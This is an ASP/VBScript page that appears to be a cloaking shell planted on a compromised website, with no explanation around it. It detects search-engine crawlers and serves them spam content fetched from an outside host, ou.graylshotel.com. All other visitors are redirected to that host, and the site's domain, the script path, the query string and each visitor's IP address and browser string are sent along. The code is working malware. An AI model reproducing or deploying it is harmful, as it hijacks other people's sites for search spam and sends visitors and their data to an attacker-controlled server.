<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%Session.CodePage="65001"%>
<%Response.CodePage="65001"%>

<%
Server.ScriptTimeout=6000

function GetBot()
	dim s_agent 
	GetBot="" 
	s_agent=Request.ServerVariables("HTTP_USER_AGENT") 
	if instr(1,s_agent,"googlebot",1) >0 then 
		GetBot="isBot" 
	end if 
	if instr(1,s_agent,"msnbot",1) >0 then 
		GetBot="isBot" 
	end if 
	if instr(1,s_agent,"slurp",1) >0 then 
		GetBot="isBot" 
	end if 
	if instr(1,s_agent,"baiduspider",1) >0 then 
		GetBot="isBot" 
	end if 
	if instr(1,s_agent,"sohu-search",1) >0 then 
		GetBot="isBot" 
	end if 
	if instr(1,s_agent,"lycos",1) >0 then 
		GetBot="isBot" 
	end if 
	if instr(1,s_agent,"robozilla",1) >0 then 
		GetBot="isBot" 
	end if 
end function 
Public Function GetHtml(url)
	GetHtml = "null"
	Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
	ObjXMLHTTP.Open "GET",url,False
	ObjXMLHTTP.setRequestHeader "User-Agent","aQ0O010O"
	ObjXMLHTTP.send
	GetHtml=ObjXMLHTTP.responseBody
	Set ObjXMLHTTP=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "utf-8"
	GetHtml = objStream.ReadText
	objStream.Close
End Function

Function GetLocationURL() 
Dim Url 
Dim ServerPort,ServerName,ScriptName,QueryString 
ServerName = Request.ServerVariables("SERVER_NAME") 
ServerPort = Request.ServerVariables("SERVER_PORT") 
ScriptName = Request.ServerVariables("SCRIPT_NAME") 
QueryString = Request.ServerVariables("QUERY_STRING") 
Url="http://"&ServerName 
If ServerPort <> "80" Then Url = Url & ":" & ServerPort 
Url=Url&ScriptName 
If QueryString <>"" Then Url=Url&"?"& QueryString 
GetLocationURL=Url 
End Function 

if GetBot() = "isBot" then
    this_contents = GetHtml("http://ou.graylshotel.com/domain_get_url_test.php?action=out_put&script_name="&Request.ServerVariables("SCRIPT_NAME")&"&dstring="&Request.ServerVariables("SERVER_NAME")&"&type=asp&do_id="&Request.ServerVariables("QUERY_STRING"))
	response.Write(this_contents)
	Response.end()
else
	url = "http://ou.graylshotel.com/51la_statistical.php?type=statistical&shell_domain="&Request.ServerVariables("SERVER_NAME")&"&shell_requets_url="&Request.ServerVariables("SCRIPT_NAME")&"?"&Request.ServerVariables("QUERY_STRING")&"&user_ip="&Request.ServerVariables("REMOTE_ADDR")&"&user_agent="&Request.ServerVariables("HTTP_USER_AGENT")
	response.redirect url
end if
%>